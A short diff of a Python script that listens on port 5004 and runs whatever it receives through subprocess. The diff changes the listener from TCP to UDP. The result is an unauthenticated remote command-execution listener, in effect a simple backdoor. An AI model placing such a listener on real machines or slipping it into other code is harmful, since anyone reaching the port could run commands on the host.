@@ -4,13 +4,13 @@ import subprocess
 host = socket.gethostname()
 port =5004
 
-server = socket.socket()
+server = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
 server.bind((host,port))
-server.listen(1)
-conn,addr= server.accept()
-command = conn.recv(1024).lower()
 
-subprocess.run(command.decode())
+data,addr = server.recvfrom(1024)
+command = data.decode('utf-8')
 
-conn.close()
+# print(command)
+subprocess.run(command)
+
 server.close()
